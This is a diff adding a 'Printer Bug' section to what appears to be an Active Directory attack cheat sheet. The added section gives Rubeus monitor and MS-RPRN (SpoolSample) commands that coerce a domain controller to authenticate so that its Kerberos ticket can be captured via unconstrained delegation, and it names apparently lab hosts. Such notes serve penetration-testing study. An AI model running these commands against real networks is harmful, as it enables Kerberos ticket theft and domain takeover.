@@ -485,7 +485,30 @@ Get-NetComputer -Unconstrained | select -ExpandProperty dnshostname
 Get-ADComputer -Filter {TrustedForDelegation -eq $True}
 Get-ADUser -Filter {TrustedForDelegation -eq $True}
 ```
+
 #### Printer Bug
 
+#### Pre-requisites
+#### Rubeus:
+```powershell
+.\Rubeus.exe
+```
+Link: [Rubeus](https://github.com/GhostPack/Rubeus)
+#### Ms-rprn:
+```powershell
+.\MS-RPRN.exe
+```
+Link: [MS-RPRN](https://github.com/leechristensen/SpoolSample)
+
+**1. Capture the TGT:**
+```powershell
+# Start monitoring for any authentication
+.\Rubeus.exe monitor /interval:5 /nowrap
+```
+**2. Run MS-RPRN.exe:**
+```powershell
+# Run MS-RPRN.exe to abuse the printer bug
+.\MS-RPRN.exe \\dcorp.corp.corporate.local \\dcorp-appsrv.corp.corporate.local
+```
 
 ### Constrained Delegation
